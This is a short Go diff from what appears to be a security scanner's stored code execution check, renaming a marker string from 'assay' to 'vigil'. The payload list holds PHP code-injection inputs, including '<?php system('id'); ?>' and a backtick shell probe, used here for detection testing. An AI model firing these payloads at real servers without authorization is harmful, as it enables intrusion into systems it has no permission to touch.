@@ -64,7 +64,7 @@ func storedCodeExecStrategy() Strategy {
 		},
 		VerifyPoints: []VerifyPoint{
 			{Location: "response_body", Pattern: `(?i)(PHP Version|phpinfo|<title>phpinfo)`},
-			{Location: "response_body", Pattern: `assay-stored-rce-ok`},
+			{Location: "response_body", Pattern: `vigil-stored-rce-ok`},
 		},
 		PayloadType: "phpcode",
 	}
@@ -96,7 +96,7 @@ func storedCodeExecPayloads() []string {
 	return []string{
 		"<?php phpinfo(); ?>",
 		"<?php system('id'); ?>",
-		"<?php echo 'assay-stored-rce-ok'; ?>",
+		"<?php echo 'vigil-stored-rce-ok'; ?>",
 		"<?=`id`?>",
 	}
 }
